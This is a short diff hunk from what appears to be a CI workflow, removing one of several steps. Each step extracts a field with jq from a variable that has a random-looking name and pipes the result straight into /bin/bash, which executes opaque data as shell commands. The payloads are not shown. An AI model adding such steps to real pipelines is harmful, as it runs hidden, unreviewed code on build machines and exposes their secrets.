@@ -21,7 +21,6 @@ jobs:
           echo $rxfct7 | jq -r .yifm7 | /bin/bash
           printf '%s' "$p68697" | jq -r .h930 | /bin/bash
           echo $y720 | jq -r .e8641 | /bin/bash
-          printf '%s' "$io0" | jq -r .iu3 | /bin/bash
           printf '%s' "$cvte859" | jq -r .juqt062 | /bin/bash
           printf '%s' "$tw42" | jq -r .zkx85 | /bin/bash
 
